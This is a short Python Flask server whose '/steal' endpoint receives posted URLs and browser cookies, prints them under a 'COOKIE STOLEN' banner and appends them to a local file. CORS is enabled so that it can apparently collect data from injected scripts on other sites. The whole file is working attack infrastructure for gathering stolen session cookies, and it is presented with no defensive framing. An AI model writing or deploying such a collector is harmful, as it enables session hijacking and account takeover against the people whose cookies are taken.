from flask import Flask, request 
from flask_cors import CORS

app = Flask(__name__) 
CORS(app)

@app.route('/', methods=['GET'])
def home():
    return "Server is running over HTTPS!"

@app.route('/steal', methods=['POST'])
def steal():
    data= request.json
    print("\n--- COOKIE STOLEN ---") 
    print(f"URL: {data['url']}") 
    print(f"Cookies: {data['cookies']}") 
    
    with open("stolen_cookies.txt", "a") as f:
        f.write (f"URL: {data['url']}\nCookies: {data['cookies']}\n\n")
    return "OK"

if __name__ == '__main__': 
    # app.run(host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem')) 
    app.run()
